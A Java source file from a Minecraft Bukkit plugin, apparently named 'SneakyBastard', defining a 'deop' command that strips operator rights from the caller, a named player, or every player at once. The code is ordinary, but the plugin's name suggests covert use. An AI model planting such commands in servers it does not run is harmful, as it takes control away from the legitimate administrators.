package net.blackofworld.SneakyBastard.Commands.Server;

import lombok.experimental.ExtensionMethod;
import net.blackofworld.SneakyBastard.Command.CommandBase;
import net.blackofworld.SneakyBastard.Command.CommandCategory;
import net.blackofworld.SneakyBastard.Command.CommandInfo;
import net.blackofworld.SneakyBastard.Extensions.PlayerExt;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.Collection;

@CommandInfo(command = "deop", description = "Removes op.", Syntax = "[player]", category = CommandCategory.Server)
@ExtensionMethod({Player.class, PlayerExt.class})
public final class DeOP extends CommandBase {
    @Override
    public void Execute(Player p, ArrayList<String> args) {
        Collection<? extends Player> pp = firstParamIsPlayer(p, args, true);
        if(pp.contains(null)) {
            p.Reply(ChatColor.RED + "No player with such name!");
            return;
        }
        pp.parallelStream().forEach(pl -> {if(pl != null) pl.SetOp(false);});
        var name = args.size() > 0 ? (args.get(0).equals("*") ? "Everyone"
                : args.get(0))
                : p.getName();
        p.Reply(ChatColor.GREEN + "%s no longer an operator".formatted(args.size() > 0 ? name + " is" : "You are"));
    }
}
